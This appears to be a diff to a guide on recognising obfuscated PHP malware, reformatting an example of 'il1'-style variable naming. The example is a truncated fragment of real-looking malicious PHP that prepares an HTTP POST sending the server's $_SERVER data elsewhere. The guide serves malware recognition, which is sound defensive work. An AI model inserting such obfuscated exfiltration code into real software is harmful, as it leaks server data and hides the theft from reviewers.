@@ -99,7 +99,11 @@ Some of the more common forms of plain obfuscated code that I've seen are `o0_` 
 #### Examples
 'il1' obfuscation tends to look similar to the below example, where most of the variables use the number 1, lowercase L, and upper or lower case I characters to deliberately confuse someone looking at the code and make it difficult to eyeball how the variables are being used.
 ~~~~~~
-    <?php if(!@$incode!=false||!@$incode!=null){$vl='s';$serverid='[hash]';$liillilllil=time();function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST','header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));if($lilillilllllill=='yes'):...
+    <?php if(!@$incode!=false||!@$incode!=null){$vl='s';$serverid='[hash]';$liillilllil=time();
+    function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){
+    if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST',
+    'header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));
+    if($lilillilllllill=='yes'):...
 ~~~~~~
 
 'o0_' obfuscation is similar, but uses uppercase O, the number 0, and the underscore character (`_`) to achieve the same end goal.
